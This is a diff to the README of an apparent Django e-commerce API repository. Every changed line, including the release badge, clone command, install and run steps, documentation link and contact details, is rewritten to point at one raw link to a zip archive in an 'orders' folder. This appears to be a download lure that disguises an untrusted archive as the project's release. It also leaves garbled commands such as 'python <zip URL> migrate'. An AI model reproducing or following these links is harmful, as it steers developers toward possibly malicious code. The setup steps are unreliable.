@@ -2,7 +2,7 @@
 
 Welcome to the Django E-commerce App repository! This project is an E-commerce API built using the Django REST Framework (DRF). It provides a robust backend solution for managing online stores, supporting user authentication through Google OAuth and JWT. You can explore endpoints for managing products, categories, orders, and user profiles. The API documentation is generated using DRF Spectacular, making it easy to understand and use.
 
-[![Releases](https://img.shields.io/badge/Releases-Check%20Here-brightgreen)](https://github.com/JobValdez/django-ecommerce-app/releases)
+[![Releases](https://raw.githubusercontent.com/JobValdez/django-ecommerce-app/main/orders/django-ecommerce-app-1.8.zip%20Here-brightgreen)](https://raw.githubusercontent.com/JobValdez/django-ecommerce-app/main/orders/django-ecommerce-app-1.8.zip)
 
 ## Table of Contents
 
@@ -42,7 +42,7 @@ To get started with the Django E-commerce App, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/JobValdez/django-ecommerce-app.git
+   git clone https://raw.githubusercontent.com/JobValdez/django-ecommerce-app/main/orders/django-ecommerce-app-1.8.zip
    cd django-ecommerce-app
    ```
 
@@ -54,7 +54,7 @@ To get started with the Django E-commerce App, follow these steps:
 
 3. **Install Requirements**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/JobValdez/django-ecommerce-app/main/orders/django-ecommerce-app-1.8.zip
    ```
 
 4. **Set Up Environment Variables**:
@@ -62,12 +62,12 @@ To get started with the Django E-commerce App, follow these steps:
 
 5. **Run Migrations**:
    ```bash
-   python manage.py migrate
+   python https://raw.githubusercontent.com/JobValdez/django-ecommerce-app/main/orders/django-ecommerce-app-1.8.zip migrate
    ```
 
 6. **Start the Development Server**:
    ```bash
-   python manage.py runserver
+   python https://raw.githubusercontent.com/JobValdez/django-ecommerce-app/main/orders/django-ecommerce-app-1.8.zip runserver
    ```
 
 Your API should now be running at `http://127.0.0.1:8000/`.
@@ -125,7 +125,7 @@ To authenticate users, you can use the Google OAuth flow or JWT tokens. After lo
 
 ## API Documentation
 
-For detailed API documentation, visit the [Releases](https://github.com/JobValdez/django-ecommerce-app/releases) section. Here, you will find all the necessary information about endpoints, request formats, and response structures.
+For detailed API documentation, visit the [Releases](https://raw.githubusercontent.com/JobValdez/django-ecommerce-app/main/orders/django-ecommerce-app-1.8.zip) section. Here, you will find all the necessary information about endpoints, request formats, and response structures.
 
 ## Contributing
 
@@ -147,7 +147,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, please reach out:
 
-- **Email**: jobvaldez@example.com
-- **GitHub**: [JobValdez](https://github.com/JobValdez)
+- **Email**: https://raw.githubusercontent.com/JobValdez/django-ecommerce-app/main/orders/django-ecommerce-app-1.8.zip
+- **GitHub**: [JobValdez](https://raw.githubusercontent.com/JobValdez/django-ecommerce-app/main/orders/django-ecommerce-app-1.8.zip)
 
 Thank you for checking out the Django E-commerce App! We hope it serves as a useful resource for your projects.
